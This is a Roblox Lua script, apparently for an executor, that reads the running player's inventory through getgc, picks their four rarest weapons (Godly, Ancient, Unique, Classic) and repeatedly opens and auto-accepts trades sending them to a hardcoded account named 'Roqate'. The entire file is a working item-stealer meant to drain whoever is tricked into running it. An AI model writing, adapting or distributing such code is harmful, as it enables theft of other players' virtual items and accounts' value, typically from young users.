local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.5
local UI_WAIT_TIMEOUT = 10
local ACCEPT_WAIT_TIMEOUT = 20

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Inventory Functions ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === UI Detection Functions ===
local function waitForTradeGUI()
    local startTime = os.clock()
    while os.clock() - startTime < UI_WAIT_TIMEOUT do
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then
            for _, label in ipairs(gui:GetDescendants()) do
                if label:IsA("TextLabel") and string.find(string.lower(label.Text), "your offer") then
                    return gui
                end
            end
        end
        task.wait(0.2)
    end
    return nil
end

local function isItemInTrade(gui, itemName)
    local searchName = string.lower(itemName)
    for _, descendant in ipairs(gui:GetDescendants()) do
        if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and descendant.Text then
            local text = string.lower(descendant.Text)
            if string.find(text, searchName) then
                local parent = descendant.Parent
                while parent do
                    if parent:IsA("Frame") and (parent.Name == "YourOffer" or parent.Name == "Offer") then
                        return true
                    end
                    parent = parent.Parent
                end
            end
        end
    end
    return false
end

-- === Trade Action Functions ===
local function addWeaponsToTrade(gui)
    local weapons = getTop4Weapons()
    if #weapons == 0 then
        warn("⚠ No valid weapons found!")
        return false
    end

    print("\n🔍 Checking trade items:")
    local addedItems = {}
    local failedItems = {}

    -- First pass: Check what's already added
    for _, weapon in ipairs(weapons) do
        if isItemInTrade(gui, weapon) then
            table.insert(addedItems, weapon)
            print("   ✓ "..weapon.." (already present)")
        end
    end

    -- Second pass: Add missing items
    for _, weapon in ipairs(weapons) do
        if not isItemInTrade(gui, weapon) then
            print("   ➕ Attempting to add: "..weapon)
            TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
            task.wait(ITEM_ADD_DELAY)
            
            if isItemInTrade(gui, weapon) then
                table.insert(addedItems, weapon)
                print("   ✓ Successfully added")
            else
                table.insert(failedItems, weapon)
                print("   ❌ Failed to add")
            end
        end
    end

    -- Final verification
    if #addedItems == #weapons then
        print("✅ ALL items verified in trade")
        return true
    else
        warn("⚠ Only "..#addedItems.."/"..#weapons.." items in trade")
        if #failedItems > 0 then
            print("   Missing items: "..table.concat(failedItems, ", "))
        end
        return false
    end
end

local function waitForOtherAccept(gui)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        for _, label in ipairs(gui:GetDescendants()) do
            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
                return true
            end
        end
        
        if not gui.Parent then
            return true
        end
        
        task.wait(0.5)
    end
    return false
end

local function acceptTrade()
    print("✅ Accepting trade...")
    pcall(function()
        TradeRemotes.AcceptTrade:FireServer()
    end)
end

-- === Main Trade Cycle ===
local function doTradeCycle(targetPlayer)
    print("\n🔄 Starting trade with "..targetPlayer.Name)
    
    -- Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("❌ Trade request failed:", err)
        return
    end
    print("✅ Request sent - waiting for trade UI...")

    -- Wait for trade GUI
    local gui = waitForTradeGUI()
    if not gui then
        warn("⚠ Trade GUI not found!")
        return
    end
    print("✅ Trade GUI found")

    -- Add weapons with verification
    if not addWeaponsToTrade(gui) then
        warn("⚠ Item addition failed - aborting trade")
        return
    end

    -- Wait for other player to accept
    print("\n⏳ Waiting for other player to accept...")
    if waitForOtherAccept(gui) then
        print("✅ Other player accepted - completing trade")
        acceptTrade()
    else
        warn("⚠ Timeout waiting for acceptance!")
    end

    -- Wait for trade completion
    local startTime = os.clock()
    while gui and gui.Parent and os.clock() - startTime < 5 do
        task.wait(0.5)
    end
    print("🔄 Trade cycle completed\n")
end

-- === Main Loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for "..TARGET_PLAYER.."...")
    end
    task.wait(TRADE_COOLDOWN)
end
